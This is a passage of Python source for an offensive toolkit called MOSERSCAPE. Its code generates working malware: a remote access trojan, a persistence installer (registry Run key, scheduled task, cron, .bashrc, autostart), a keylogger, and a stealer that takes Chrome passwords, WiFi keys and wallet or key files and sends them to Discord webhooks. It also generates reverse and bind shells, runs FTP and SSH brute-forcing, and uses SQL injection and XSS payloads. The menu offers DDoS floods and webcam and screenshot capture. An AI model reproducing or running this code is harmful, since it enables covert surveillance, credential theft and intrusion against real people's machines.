            try:
                with open(os.path.expanduser("~/.bashrc"), "a") as f:
                    f.write(f"\\npython3 {os.path.abspath(__file__)} >/dev/null 2>&1 &\\n")
            except:
                pass
    except:
        pass

if not os.path.exists(".installed"):
    persist()
    open(".installed", "w").write("1")

while True:
    try:
        info = get_info()
        wifi = steal_wifi()
        browsers = steal_browsers()
        files = steal_files()
        
        msg = f"""**MOSERSCAPE RAT**\\n```\\nHost: {{info['hostname']}}\\nOS: {{info['os']}} {{info['os_version']}}\\nUser: {{info['user']}}\\nIP: {{info['ip_local']}} (local)\\nIP: {{info['ip_public']}} (public)\\nMAC: {{info['mac']}}\\nMem: {{info['mem']}}\\nDisk: {{info['disk']}}\\nBoot: {{info['boot']}}\\nCPU: {{info['cpu']}} cores\\n```"""
        if wifi:
            msg += f"\\n**WiFi**\\n```\\n{{wifi[:1000]}}```"
        send(msg)
        
        ss = screenshot()
        if ss:
            send("", ss)
            os.remove(ss)
        
        wc = webcam()
        if wc:
            send("", wc)
            os.remove(wc)
        
        for b in browsers:
            send("", b)
            os.remove(b)
        
        for f in files[:3]:
            send("", f)
    except:
        pass
    time.sleep(SLEEP)
'''
        with open(name, 'w') as f:
            f.write(code)
        print(DARK_RED + f"[+] Full RAT saved to {name}" + RESET)
    
    def generate_persistence(self, name="persist.py"):
        hooks = json.dumps(self.webhooks)
        code = f'''#!/usr/bin/env python3
import os,sys,platform,shutil,subprocess,getpass,requests,time,socket

webhooks = {hooks}

def send(data):
    for hook in webhooks:
        try:
            requests.post(hook, json={{"content": data[:1900]}}, timeout=3)
        except:
            pass

def install():
    try:
        current = sys.executable if getattr(sys, 'frozen', False) else __file__
        if platform.system() == "Windows":
            startup = os.path.expandvars(r"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            if os.path.exists(startup):
                dest = os.path.join(startup, "svchost.py")
                shutil.copy2(current, dest)
                try:
                    import winreg
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
                        winreg.SetValueEx(reg, "WindowsService", 0, winreg.REG_SZ, dest)
                except:
                    pass
                try:
                    subprocess.run(f'schtasks /create /tn "WindowsService" /tr "python {{dest}}" /sc daily /st 09:00 /f', shell=True)
                except:
                    pass
        else:
            cron = f"@reboot python3 {os.path.abspath(__file__)} >/dev/null 2>&1"
            try:
                cur = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
                with open("/tmp/cron.tmp", "w") as f:
                    f.write(cur + cron + "\\n")
                subprocess.run(["crontab", "/tmp/cron.tmp"])
                os.remove("/tmp/cron.tmp")
            except:
                pass
            try:
                with open(os.path.expanduser("~/.bashrc"), "a") as f:
                    f.write(f"\\npython3 {os.path.abspath(__file__)} >/dev/null 2>&1 &\\n")
            except:
                pass
            autostart = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart, exist_ok=True)
            desktop = f"""[Desktop Entry]
Type=Application
Name=System Service
Exec=python3 {os.path.abspath(__file__)}
X-GNOME-Autostart-enabled=true
"""
            with open(os.path.join(autostart, "system-service.desktop"), "w") as f:
                f.write(desktop)
        return True
    except:
        return False

host = socket.gethostname()
user = getpass.getuser()
send(f"**Persistence Installer**\\nHost: {{host}}\\nUser: {{user}}")
success = install()
send(f"**Result**\\nHost: {{host}}\\nSuccess: {{success}}")
while True:
    time.sleep(3600)
'''
        with open(name, 'w') as f:
            f.write(code)
        print(DARK_RED + f"[+] Persistence payload saved to {name}" + RESET)
    
    def generate_keylogger(self, name="keylog.py"):
        hooks = json.dumps(self.webhooks)
        code = f'''#!/usr/bin/env python3
import pynput,requests,threading,time,os,socket
from pynput import keyboard

webhooks = {hooks}
log = ""
last_send = time.time()

def send(data):
    for hook in webhooks:
        try:
            requests.post(hook, json={{"content": data[:1900]}}, timeout=3)
        except:
            pass

def on_press(key):
    global log, last_send
    try:
        log += key.char
    except:
        if key == keyboard.Key.space:
            log += ' '
        elif key == keyboard.Key.enter:
            log += '\\n'
        elif key == keyboard.Key.tab:
            log += '\\t'
        elif key == keyboard.Key.backspace:
            log += '[BACKSPACE]'
        elif key == keyboard.Key.delete:
            log += '[DELETE]'
        elif key == keyboard.Key.shift:
            log += '[SHIFT]'
        elif key == keyboard.Key.ctrl:
            log += '[CTRL]'
        elif key == keyboard.Key.alt:
            log += '[ALT]'
        elif key == keyboard.Key.cmd:
            log += '[CMD]'
        else:
            log += f'[{{str(key)}}]'
    
    if time.time() - last_send > 60:
        if log:
            host = socket.gethostname()
            send(f"**Keylog from {{host}}**\\n```\\n{{log[-1900:]}}```")
            log = ""
            last_send = time.time()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
'''
        with open(name, 'w') as f:
            f.write(code)
        print(DARK_RED + f"[+] Keylogger saved to {name}" + RESET)
    
    def generate_stealer(self, name="stealer.py"):
        hooks = json.dumps(self.webhooks)
        code = f'''#!/usr/bin/env python3
import os,sys,platform,shutil,sqlite3,json,requests,subprocess,getpass,socket
from pathlib import Path

webhooks = {hooks}

def send(data, file=None):
    for hook in webhooks:
        try:
            if file and os.path.exists(file):
                with open(file, 'rb') as f:
                    requests.post(hook, files={{"file": (os.path.basename(file), f)}}, timeout=5)
            else:
                requests.post(hook, json={{"content": data[:1900]}}, timeout=3)
        except:
            pass

def steal_wifi():
    if platform.system() != "Windows":
        return ""
    result = ""
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        for line in profiles.split('\\n'):
            if "All User Profile" in line:
                profile = line.split(":")[1].strip()
                try:
                    data = subprocess.check_output(f'netsh wlan show profile "{{profile}}" key=clear', shell=True, text=True)
                    result += f"SSID: {{profile}}\\n"
                    for l in data.split('\\n'):
                        if "Key Content" in l:
                            result += f"Pass: {{l.split(':')[1].strip()}}\\n\\n"
                except:
                    pass
    except:
        pass
    return result

def steal_chrome():
    if platform.system() != "Windows":
        return ""
    path = os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data")
    if not os.path.exists(path):
        return ""
    try:
        shutil.copy2(path, "chrome.db")
        conn = sqlite3.connect("chrome.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = ""
        for row in cursor.fetchall()[:20]:
            data += f"URL: {{row[0]}}\\nUser: {{row[1]}}\\nPass: {{row[2]}}\\n\\n"
        conn.close()
        os.remove("chrome.db")
        return data
    except:
        return ""

def steal_files():
    files = []
    targets = [str(Path.home()/"Desktop"), str(Path.home()/"Documents")]
    exts = ('.txt', '.doc', '.pdf', '.jpg', '.png', '.kdbx', '.wallet', '.key', '.ovpn', '.rdp')
    for target in targets:
        if os.path.exists(target):
            for f in os.listdir(target)[:10]:
                path = os.path.join(target, f)
                if os.path.isfile(path) and f.endswith(exts):
                    files.append(path)
    return files

host = socket.gethostname()
user = getpass.getuser()
send(f"**Stealer started**\\nHost: {{host}}\\nUser: {{user}}")

chrome = steal_chrome()
if chrome:
    send(f"**Chrome Passwords**\\n```\\n{{chrome[:1900]}}```")

wifi = steal_wifi()
if wifi:
    send(f"**WiFi Passwords**\\n```\\n{{wifi[:1900]}}```")

for f in steal_files():
    send(f"File: {{os.path.basename(f)}}", f)
'''
        with open(name, 'w') as f:
            f.write(code)
        print(DARK_RED + f"[+] Stealer saved to {name}" + RESET)
    
    def generate_reverse_shell(self, name="reverse.py", ip="127.0.0.1", port=4444):
        code = f'''#!/usr/bin/env python3
import socket,subprocess,os,pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{ip}", {port}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
'''
        with open(name, 'w') as f:
            f.write(code)
        print(DARK_RED + f"[+] Reverse shell saved to {name} (connect to {ip}:{port})" + RESET)
    
    def generate_bind_shell(self, name="bind.py", port=4444):
        code = f'''#!/usr/bin/env python3
import socket,subprocess,os,pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", {port}))
s.listen(1)
conn, addr = s.accept()
os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
pty.spawn("/bin/sh")
'''
        with open(name, 'w') as f:
            f.write(code)
        print(DARK_RED + f"[+] Bind shell saved to {name} (listening on port {port})" + RESET)

class ExploitModule:
    def ftp_bruteforce(self, host, userlist, passlist):
        print(DARK_RED + f"\n[•] FTP Bruteforce on {host}\n" + RESET)
        for user in userlist:
            for pwd in passlist:
                try:
                    ftp = ftplib.FTP(host)
                    ftp.login(user, pwd)
                    print(DARK_RED + f"[+] Success: {user}:{pwd}" + RESET)
                    ftp.quit()
                    return {'user': user, 'pass': pwd}
                except:
                    pass
        print(DARK_RED + "[-] No credentials found" + RESET)
        return None
    
    def ssh_bruteforce(self, host, userlist, passlist):
        print(DARK_RED + f"\n[•] SSH Bruteforce on {host}\n" + RESET)
        for user in userlist:
            for pwd in passlist:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, username=user, password=pwd, timeout=3)
                    print(DARK_RED + f"[+] Success: {user}:{pwd}" + RESET)
                    ssh.close()
                    return {'user': user, 'pass': pwd}
                except:
                    pass
        print(DARK_RED + "[-] No credentials found" + RESET)
        return None
    
    def sql_injection_scan(self, url):
        print(DARK_RED + f"\n[•] SQL Injection Scan on {url}\n" + RESET)
        payloads = ["'", "\"", "';", "\";", "' OR '1'='1", "\" OR \"1\"=\"1", "' UNION SELECT NULL--", "'; DROP TABLE users--"]
        for payload in payloads:
            try:
                r = requests.get(url + payload, timeout=3)
                if "sql" in r.text.lower() or "mysql" in r.text.lower() or "syntax" in r.text.lower():
                    print(DARK_RED + f"[+] Possible SQLi with: {payload}" + RESET)
            except:
                pass
    
    def xss_scan(self, url):
        print(DARK_RED + f"\n[•] XSS Scan on {url}\n" + RESET)
        payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>", "<svg onload=alert(1)>"]
        for payload in payloads:
            try:
                r = requests.get(url + urllib.parse.quote(payload), timeout=3)
                if payload in r.text:
                    print(DARK_RED + f"[+] Possible XSS with: {payload}" + RESET)
            except:
                pass
    
    def dir_buster(self, url):
        print(DARK_RED + f"\n[•] Directory Buster on {url}\n" + RESET)
        dirs = ['admin', 'login', 'wp-admin', 'wp-content', 'backup', 'config', 'sql', 'phpmyadmin', 'images', 'uploads', 'download', 'api', 'v1', 'v2', 'test', 'dev', 'stage', 'private', 'hidden', 'secret']
        found = []
        for d in dirs:
            try:
                r = requests.get(f"{url}/{d}", timeout=2)
                if r.status_code == 200:
                    print(DARK_RED + f"[+] Found: {url}/{d}" + RESET)
                    found.append(f"{url}/{d}")
                elif r.status_code == 403:
                    print(DARK_RED + f"[!] Forbidden: {url}/{d}" + RESET)
            except:
                pass
        return found
    
    def wordpress_scan(self, url):
        print(DARK_RED + f"\n[•] WordPress Scan on {url}\n" + RESET)
        paths = ['wp-admin', 'wp-content', 'wp-includes', 'wp-json', 'xmlrpc.php', 'wp-config.php', 'wp-login.php', 'wp-signup.php', 'wp-activate.php']
        for p in paths:
            try:
                r = requests.get(f"{url}/{p}", timeout=2)
                if r.status_code == 200:
                    print(DARK_RED + f"[+] Found: {url}/{p}" + RESET)
            except:
                pass

class SystemModule:
    def list_processes(self):
        print(DARK_RED + "\n[•] Running Processes\n" + RESET)
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                print(DARK_RED + f"[+] {proc.info}" + RESET)
            except:
                pass
    
    def kill_process(self, pid):
        try:
            p = psutil.Process(int(pid))
            p.terminate()
            print(DARK_RED + f"[+] Process {pid} terminated" + RESET)
        except:
            print(DARK_RED + f"[-] Failed to terminate {pid}" + RESET)
    
    def net_connections(self):
        print(DARK_RED + "\n[•] Network Connections\n" + RESET)
        for conn in psutil.net_connections():
            try:
                print(DARK_RED + f"[+] {conn}" + RESET)
            except:
                pass
    
    def disk_usage(self):
        print(DARK_RED + "\n[•] Disk Usage\n" + RESET)
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                print(DARK_RED + f"[+] {part.mountpoint}: {usage.percent}% used ({usage.free // (1024**3)}GB free)" + RESET)
            except:
                pass
    
    def sensors(self):
        print(DARK_RED + "\n[•] Sensors\n" + RESET)
        temps = psutil.sensors_temperatures()
        for name, entries in temps.items():
            for entry in entries:
                print(DARK_RED + f"[+] {name}: {entry.current}°C" + RESET)
    
    def battery(self):
        batt = psutil.sensors_battery()
        if batt:
            print(DARK_RED + f"[+] Battery: {batt.percent}%, charging: {batt.power_plugged}" + RESET)
    
    def screenshot(self):
        try:
            img = pyautogui.screenshot()
            name = f"screenshot_{int(time.time())}.png"
            img.save(name)
            print(DARK_RED + f"[+] Screenshot saved to {name}" + RESET)
            return name
        except:
            print(DARK_RED + "[-] Screenshot failed" + RESET)
            return None
    
    def webcam(self):
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                name = f"webcam_{int(time.time())}.jpg"
                cv2.imwrite(name, frame)
                cam.release()
                print(DARK_RED + f"[+] Webcam capture saved to {name}" + RESET)
                return name
            cam.release()
        except:
            print(DARK_RED + "[-] Webcam capture failed" + RESET)
        return None
    
    def system_info(self):
        info = {
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "cpu_count": os.cpu_count(),
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "public_ip": Utils.get_public_ip(),
            "local_ip": Utils.get_local_ip(),
            "mac": Utils.get_mac()
        }
        for k, v in info.items():
            print(DARK_RED + f"[+] {k}: {v}" + RESET)
        return info

class NetworkModule:
    def packet_sniffer(self, count=10):
        print(DARK_RED + f"\n[•] Sniffing {count} packets...\n" + RESET)
        packets = scapy.sniff(count=count)
        for pkt in packets:
            print(DARK_RED + f"[+] {pkt.summary()}" + RESET)
        return packets
    
    def arp_scan(self, network):
        print(DARK_RED + f"\n[•] ARP Scan on {network}\n" + RESET)
        try:
            ans = scapy.arping(network, timeout=2, verbose=False)
            for sent, received in ans[0]:
                print(DARK_RED + f"[+] {received.psrc} - {received.hwsrc}" + RESET)
        except:
            print(DARK_RED + "[-] ARP scan failed" + RESET)
    
    def traceroute(self, target):
        print(DARK_RED + f"\n[•] Traceroute to {target}\n" + RESET)
        try:
            result = scapy.traceroute(target, maxttl=20, verbose=False)
            result.show()
        except:
            print(DARK_RED + "[-] Traceroute failed" + RESET)
    
    def dns_zone_transfer(self, domain):
        print(DARK_RED + f"\n[•] DNS Zone Transfer for {domain}\n" + RESET)
        try:
            ns = dns.resolver.resolve(domain, 'NS')
            for server in ns:
                try:
                    z = dns.zone.from_xfr(dns.query.xfr(str(server), domain))
                    for name, node in z.nodes.items():
                        print(DARK_RED + f"[+] {name}" + RESET)
                except:
                    pass
        except:
            print(DARK_RED + "[-] Zone transfer failed" + RESET)

class CryptoModule:
    def generate_key(self):
        key = Fernet.generate_key()
        print(DARK_RED + f"[+] Fernet key: {key.decode()}" + RESET)
        return key
    
    def encrypt_file(self, path, key):
        try:
            f = Fernet(key)
            with open(path, 'rb') as file:
                data = file.read()
            encrypted = f.encrypt(data)
            with open(path + '.enc', 'wb') as file:
                file.write(encrypted)
            print(DARK_RED + f"[+] Encrypted: {path}.enc" + RESET)
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
    
    def decrypt_file(self, path, key):
        try:
            f = Fernet(key)
            with open(path, 'rb') as file:
                data = file.read()
            decrypted = f.decrypt(data)
            out = path.replace('.enc', '')
            with open(out, 'wb') as file:
                file.write(decrypted)
            print(DARK_RED + f"[+] Decrypted: {out}" + RESET)
        except Exception as e:
            print(DARK_RED + f"[-] Error: {e}" + RESET)
    
    def hash_file(self, path):
        try:
            md5 = hashlib.md5()
            sha1 = hashlib.sha1()
            sha256 = hashlib.sha256()
            with open(path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    md5.update(chunk)
                    sha1.update(chunk)
                    sha256.update(chunk)
            print(DARK_RED + f"[+] MD5: {md5.hexdigest()}" + RESET)
            print(DARK_RED + f"[+] SHA1: {sha1.hexdigest()}" + RESET)
            print(DARK_RED + f"[+] SHA256: {sha256.hexdigest()}" + RESET)
            return {'md5': md5.hexdigest(), 'sha1': sha1.hexdigest(), 'sha256': sha256.hexdigest()}
        except:
            print(DARK_RED + "[-] Error hashing file" + RESET)
            return None

class Tool:
    def __init__(self):
        self.osint = OSINTModule()
        self.payload = PayloadGenerator()
        self.exploit = ExploitModule()
        self.system = SystemModule()
        self.network = NetworkModule()
        self.crypto = CryptoModule()
        self.ddos = DDOSModule()
        self.code_gen = CodeGenerator()
        self.updater = Updater()
    
    def show_banner(self):
        Utils.clear()
        print(CREDIT)
        print(ASCII_ART)
        print(DARK_RED + "═══════════════════════════════════════════════════════════════════════" + RESET)
        print("")
    
    def display_menu(self):
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                           OSINT (1-15)                                ║" + RESET)
        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
        print(DARK_RED + "║ 1. Google Search   2. Google Dork     3. Username Lookup             ║" + RESET)
        print(DARK_RED + "║ 4. Email Lookup    5. Phone Lookup    6. IP Lookup                   ║" + RESET)
        print(DARK_RED + "║ 7. DNS Lookup      8. Port Scanner    9. Subdomain Enum              ║" + RESET)
        print(DARK_RED + "║10. WHOIS Lookup   11. Pastebin Search12. Reverse Image               ║" + RESET)
        print(DARK_RED + "║13. Metadata Extract14. Breach Check  15. Wayback Machine             ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
        
        print("\n")
        
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                         DDOS ATTACKS (16-20)                          ║" + RESET)
        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
        print(DARK_RED + "║16. HTTP Flood     17. SYN Flood       18. UDP Flood                   ║" + RESET)
        print(DARK_RED + "║19. ICMP Flood     20. Slowloris                                        ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
        
        print("\n")
        
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                         PAYLOAD GENERATOR (21-30)                     ║" + RESET)
        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
        print(DARK_RED + "║21. Full RAT       22. Persistence     23. Keylogger                   ║" + RESET)
        print(DARK_RED + "║24. Stealer        25. Reverse Shell   26. Bind Shell                  ║" + RESET)
        print(DARK_RED + "║27. Add Webhook    28. Clear Webhooks  29. Show Webhooks               ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
        
        print("\n")
        
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                         EXPLOIT (31-36)                               ║" + RESET)
        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
        print(DARK_RED + "║31. FTP Bruteforce  32. SSH Bruteforce  33. SQLi Scanner              ║" + RESET)
        print(DARK_RED + "║34. XSS Scanner     35. Dir Buster      36. WordPress Scan            ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
        
        print("\n")
        
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                         SYSTEM (41-50)                                ║" + RESET)
        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
        print(DARK_RED + "║41. List Processes  42. Kill Process    43. Net Connections           ║" + RESET)
        print(DARK_RED + "║44. Disk Usage      45. Sensors         46. Battery Info              ║" + RESET)
        print(DARK_RED + "║47. Screenshot      48. Webcam          49. System Info               ║" + RESET)
        print(DARK_RED + "║50. WiFi Passwords                                                     ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
        
        print("\n")
        
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                         NETWORK/CRYPTO (51-55)                        ║" + RESET)
        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
        print(DARK_RED + "║51. Packet Sniffer  52. ARP Scan        53. Traceroute                ║" + RESET)
        print(DARK_RED + "║54. Generate Key    55. Encrypt/Decrypt                                ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
        
        print("\n")
        
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                         AI CODE GENERATION (56)                       ║" + RESET)
        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
        print(DARK_RED + "║56. Generate Code with AI                                               ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
        
        print("\n")
        
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                         UPDATE (57)                                   ║" + RESET)
        print(DARK_RED + "╠═══════════════════════════════════════════════════════════════════════╣" + RESET)
        print(DARK_RED + "║57. Check for Updates                                                  ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
        
        print("\n")
        
        print(DARK_RED + "╔═══════════════════════════════════════════════════════════════════════╗" + RESET)
        print(DARK_RED + "║                               EXIT (0)                                ║" + RESET)
        print(DARK_RED + "╚═══════════════════════════════════════════════════════════════════════╝" + RESET)
    
    def run(self):
        while True:
            self.show_banner()
            self.display_menu()
            
            choice = input(DARK_RED + "\n[?] Select: " + RESET)
            
            if choice == '0':
                print(DARK_RED + "\n[-] Exiting MOSERSCAPE" + RESET)
                sys.exit(0)
            
            elif choice == '1':
                q = input(DARK_RED + "[?] Search query: " + RESET)
                self.osint.google_search(q)
            
            elif choice == '2':
                q = input(DARK_RED + "[?] Dork query: " + RESET)
                self.osint.google_dork(q)
            
            elif choice == '3':
                u = input(DARK_RED + "[?] Username: " + RESET)
                self.osint.username_lookup(u)
            
            elif choice == '4':
                e = input(DARK_RED + "[?] Email: " + RESET)
                self.osint.email_lookup(e)
            
            elif choice == '5':
                p = input(DARK_RED + "[?] Phone (with country code): " + RESET)
                self.osint.phone_lookup(p)
            
            elif choice == '6':
                i = input(DARK_RED + "[?] IP: " + RESET)
                self.osint.ip_lookup(i)
            
            elif choice == '7':
                d = input(DARK_RED + "[?] Domain: " + RESET)
                self.osint.dns_lookup(d)
            
            elif choice == '8':
                t = input(DARK_RED + "[?] Target IP: " + RESET)
                s = input(DARK_RED + "[?] Start port (1): " + RESET) or "1"
                e = input(DARK_RED + "[?] End port (1000): " + RESET) or "1000"
                self.osint.port_scan(t, int(s), int(e))
            
            elif choice == '9':
                d = input(DARK_RED + "[?] Domain: " + RESET)
                self.osint.subdomain_enum(d)
            
            elif choice == '10':
                d = input(DARK_RED + "[?] Domain: " + RESET)
                self.osint.whois_lookup(d)
            
            elif choice == '11':
                q = input(DARK_RED + "[?] Query: " + RESET)
                self.osint.pastebin_search(q)
            
            elif choice == '12':
                p = input(DARK_RED + "[?] Image path: " + RESET)
                self.osint.reverse_image(p)
            
            elif choice == '13':
                p = input(DARK_RED + "[?] File path: " + RESET)
                self.osint.metadata_extract(p)
            
            elif choice == '14':
                e = input(DARK_RED + "[?] Email: " + RESET)
                self.osint.breach_check(e)
            
            elif choice == '15':
                u = input(DARK_RED + "[?] URL: " + RESET)
                self.osint.wayback(u)
            
            elif choice == '16':
                url = input(DARK_RED + "[?] URL: " + RESET)
                dur = int(input(DARK_RED + "[?] Duration (seconds): " + RESET) or "10")
                thr = int(input(DARK_RED + "[?] Threads (100): " + RESET) or "100")
                self.ddos.http_flood(url, dur, thr)
            
            elif choice == '17':
                target = input(DARK_RED + "[?] Target IP: " + RESET)
                port = int(input(DARK_RED + "[?] Target Port: " + RESET))
                dur = int(input(DARK_RED + "[?] Duration (seconds): " + RESET) or "10")
                self.ddos.syn_flood(target, port, dur)
            
            elif choice == '18':
                target = input(DARK_RED + "[?] Target IP: " + RESET)
                port = int(input(DARK_RED + "[?] Target Port: " + RESET))
                dur = int(input(DARK_RED + "[?] Duration (seconds): " + RESET) or "10")
                self.ddos.udp_flood(target, port, dur)
            
            elif choice == '19':
                target = input(DARK_RED + "[?] Target IP: " + RESET)
                dur = int(input(DARK_RED + "[?] Duration (seconds): " + RESET) or "10")
                self.ddos.icmp_flood(target, dur)
            
            elif choice == '20':
                target = input(DARK_RED + "[?] Target IP: " + RESET)
                dur = int(input(DARK_RED + "[?] Duration (seconds): " + RESET) or "10")
                self.ddos.slowloris(target, dur)
            
            elif choice == '21':
                if not self.payload.webhooks:
                    print(DARK_RED + "[-] Add webhook first (option 27)" + RESET)
                else:
                    name = input(DARK_RED + "[?] Output filename (full_rat.py): " + RESET) or "full_rat.py"
                    self.payload.generate_full_rat(name)
            
            elif choice == '22':
                if not self.payload.webhooks:
                    print(DARK_RED + "[-] Add webhook first (option 27)" + RESET)
                else:
                    name = input(DARK_RED + "[?] Output filename (persist.py): " + RESET) or "persist.py"
                    self.payload.generate_persistence(name)
            
            elif choice == '23':
                if not self.payload.webhooks:
                    print(DARK_RED + "[-] Add webhook first (option 27)" + RESET)
                else:
                    name = input(DARK_RED + "[?] Output filename (keylog.py): " + RESET) or "keylog.py"
                    self.payload.generate_keylogger(name)
            
            elif choice == '24':
                if not self.payload.webhooks:
                    print(DARK_RED + "[-] Add webhook first (option 27)" + RESET)
                else:
                    name = input(DARK_RED + "[?] Output filename (stealer.py): " + RESET) or "stealer.py"
                    self.payload.generate_stealer(name)
            
            elif choice == '25':
                ip = input(DARK_RED + "[?] Listener IP: " + RESET) or "127.0.0.1"
                port = int(input(DARK_RED + "[?] Listener Port (4444): " + RESET) or "4444")
                name = input(DARK_RED + "[?] Output filename (reverse.py): " + RESET) or "reverse.py"
                self.payload.generate_reverse_shell(name, ip, port)
            
            elif choice == '26':
                port = int(input(DARK_RED + "[?] Bind Port (4444): " + RESET) or "4444")
                name = input(DARK_RED + "[?] Output filename (bind.py): " + RESET) or "bind.py"
                self.payload.generate_bind_shell(name, port)
            
            elif choice == '27':
                url = input(DARK_RED + "[?] Discord webhook URL: " + RESET)
                self.payload.add_webhook(url)
            
            elif choice == '28':
                self.payload.clear_webhooks()
            
            elif choice == '29':
                print(DARK_RED + f"[+] Current webhooks: {len(self.payload.webhooks)}" + RESET)
                for i, w in enumerate(self.payload.webhooks, 1):
                    print(DARK_RED + f"    {i}. {w}" + RESET)
            
            elif choice == '31':
                h = input(DARK_RED + "[?] Host: " + RESET)
                uf = input(DARK_RED + "[?] User list file (users.txt): " + RESET) or "users.txt"
                pf = input(DARK_RED + "[?] Pass list file (pass.txt): " + RESET) or "pass.txt"
                try:
                    with open(uf) as f: users = [l.strip() for l in f]
                    with open(pf) as f: passes = [l.strip() for l in f]
                    self.exploit.ftp_bruteforce(h, users, passes)
                except:
                    print(DARK_RED + "[-] Error loading wordlists" + RESET)
            
            elif choice == '32':
                h = input(DARK_RED + "[?] Host: " + RESET)
                uf = input(DARK_RED + "[?] User list file (users.txt): " + RESET) or "users.txt"
                pf = input(DARK_RED + "[?] Pass list file (pass.txt): " + RESET) or "pass.txt"
                try:
                    with open(uf) as f: users = [l.strip() for l in f]
                    with open(pf) as f: passes = [l.strip() for l in f]
                    self.exploit.ssh_bruteforce(h, users, passes)
                except:
                    print(DARK_RED + "[-] Error loading wordlists" + RESET)
            
            elif choice == '33':
                u = input(DARK_RED + "[?] URL: " + RESET)
                self.exploit.sql_injection_scan(u)
            
            elif choice == '34':
                u = input(DARK_RED + "[?] URL: " + RESET)
                self.exploit.xss_scan(u)
            
            elif choice == '35':
                u = input(DARK_RED + "[?] URL: " + RESET)
                self.exploit.dir_buster(u)
            
            elif choice == '36':
                u = input(DARK_RED + "[?] URL: " + RESET)
                self.exploit.wordpress_scan(u)
            
            elif choice == '41':
                self.system.list_processes()
            
            elif choice == '42':
                pid = input(DARK_RED + "[?] PID: " + RESET)
                self.system.kill_process(pid)
            
            elif choice == '43':
                self.system.net_connections()
            
            elif choice == '44':
                self.system.disk_usage()
            
            elif choice == '45':
                self.system.sensors()
            
            elif choice == '46':
                self.system.battery()
            
            elif choice == '47':
                self.system.screenshot()
            
            elif choice == '48':
                self.system.webcam()
            
            elif choice == '49':
                self.system.system_info()
            
            elif choice == '50':
                wifi = Utils.get_wifi_passwords()
                for w in wifi:
                    print(DARK_RED + f"[+] {w}" + RESET)
            
            elif choice == '51':
                c = int(input(DARK_RED + "[?] Packet count: " + RESET) or "10")
                self.network.packet_sniffer(c)
            
            elif choice == '52':
                net = input(DARK_RED + "[?] Network (e.g., 192.168.1.0/24): " + RESET)
                self.network.arp_scan(net)
            
            elif choice == '53':
                t = input(DARK_RED + "[?] Target: " + RESET)
                self.network.traceroute(t)
            
            elif choice == '54':
                self.crypto.generate_key()
            
            elif choice == '55':
                print(DARK_RED + "1. Encrypt file" + RESET)
                print(DARK_RED + "2. Decrypt file" + RESET)
                print(DARK_RED + "3. Hash file" + RESET)
                sub = input(DARK_RED + "[?] Select: " + RESET)
                if sub == '1':
                    path = input(DARK_RED + "[?] File path: " + RESET)
                    key = input(DARK_RED + "[?] Key: " + RESET).encode()
